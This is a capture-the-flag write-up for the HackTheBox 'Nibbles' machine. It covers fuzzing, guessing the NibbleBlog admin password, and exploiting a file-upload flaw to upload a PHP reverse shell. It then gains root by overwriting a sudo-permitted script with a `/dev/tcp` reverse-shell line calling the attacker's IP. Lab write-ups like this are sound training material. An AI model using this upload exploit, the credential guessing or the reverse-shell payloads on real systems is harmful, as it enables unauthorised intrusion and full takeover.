
Add IP to `/etc/hosts` file, so we don't need to memorize it every time.

![[HackTheBox/Nibbles/images/1.png]]

ICMP ping the target:

`ping nibbles.htb`

It's alive.

![[HackTheBox/Nibbles/images/2.png]]

I skipped the port scan this time and simply accessed `port 80`:

![[HackTheBox/Nibbles/images/3.png]]

Begin with fuzzing:

Nothing interesting from either tool:

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://nibbles.htb/FUZZ
```

![[HackTheBox/Nibbles/images/4.png]]

```bash
dirsearch -u nibbles.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

![[HackTheBox/Nibbles/images/5.png]]

At the same time, I also viewed the page source and encountered a comment:

The page routes to another page.

![[HackTheBox/Nibbles/images/6.png]]

Looks like the product name is `NibbleBlog`:

![[HackTheBox/Nibbles/images/7.png]]

I was examining the page source and identified a PHP file path:

![[HackTheBox/Nibbles/images/8.png]]

There was another IP address direction, weird:

![[HackTheBox/Nibbles/images/9.png]]

Let's dive under `/nibbleblog/` page straightforwardly:

The following wordlists did not identify anything:

```bash
directory-list-2.3-small.txt
directory-list-2.3-medium.txt

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://nibbles.htb/nibblesblog/FUZZ

dirsearch -u http://nibbles.htb/nibblesblog/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

![[HackTheBox/Nibbles/images/10.png]]

![[HackTheBox/Nibbles/images/11.png]]

Since I had typo issues on the directory name `/nibbleblog/`, let's try again:

Now it works. Let's shift to the `/admin/` page:

![[12.png]]

Based on `/usr/share/wordlists/dirb/common.txt` fuzz, `admin.php` is accessible:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://nibbles.htb/nibbleblog/FUZZ
```

![[13.png]]

`searchsploit` resulted in only two vulnerabilities:

```bash
searchsploit "nibble"
```

![[14.png]]

As login credentials, the following attempts did not work:

```bash
admin:admin
admin:password
admin:root
root:root
toor:root
```

Then I noticed the machine's name and blog, so I tried `admin:nibbleblog`, `admin:nibblesblog`, `nibbleblog:nibblesblog`, `nibbleblog:nibbleblog`, `nibblesblog:nibblesblog`, and `admin:nibbles` respectively.

Last one worked only:

![[15.png]]

I searched for any exploit alternatives:

![[16.png]]

Then found the official CVE disclosure page:

![[17.png]]

```
Vulnerability Description:

When uploading image files via the "My image" plugin — which is
delivered with NibbleBlog by default — NibbleBlog 4.0.3 keeps the
original extension of uploaded files. This extension or the actual file
type are not checked, thus it is possible to upload PHP files and gain
code execution.

Note: Admin credentials are required.

Proof of Concept:
1. Obtain admin credentials
2. Activate My image plugin by visiting
   http://localhost/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image
3. Upload PHP shell, ignore warnings
4. Visit http://localhost/nibbleblog/content/private/plugins/my_image/image.php
   (default name of images uploaded via the plugin)
```

Let's go to the plugin page and activate it.

I will use pentestmonkey's generic reverse shell:

[REVSHELL](https://github.com/pentestmonkey/php-reverse-shell)

Change IP and port to your attacker machine's. I uploaded my shell.

`http://nibbles.htb/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image`

![[18.png]]

Execute the shell trigger:

`http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php`

`penelope -p 1234`

Then I got a shell:

![[19.png]]

As initial foothold, I began with `sudo -l` to identify whether there is a binary that I can run.

![[20.png]]

Got user flag:

![[22.png]]

Let's see `monitor.sh`:

Now I will change the content of the script and get a reverse shell via [GTFOBins](https://gtfobins.github.io/gtfobins/bash/).

![[21.png]]

You must use the full path instead of just `sudo bash` as binary.

`sudo /home/nibbler/personal/stuff/monitor.sh`

```bash
echo "sudo /home/nibbler/personal/stuff/monitor.sh" > monitor.sh
```

I also called the binary with its full path:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

I needed an interactive shell, so I added a reverse shell payload instead:

`echo "sh -i >& /dev/tcp/10.10.16.64/3210 0>&1" > monitor.sh`

I will also add `shebang` at the beginning of the bash script, so it may work.

![[23.png]]

`#!/bin/bash`

[shebang](https://earthly.dev/blog/understanding-bash/#:~:text=%23!%2Fbin%2Fbash,-The%20most%20common&text=Essentially%20it%20tells%20your%20terminal,to%20work%20specifically%20with%20bash.)

```bash
echo "#!/bin/bash" > monitor.sh
echo "sh -i >& /dev/tcp/10.10.16.64/3210 0>&1" >> monitor.sh
```

![[24.png]]

Then called listener `penelope -p 3210`.

![[25.png]]

Now I got root shell:

![[26.png]]

Obtained root flag:

![[27.png]]
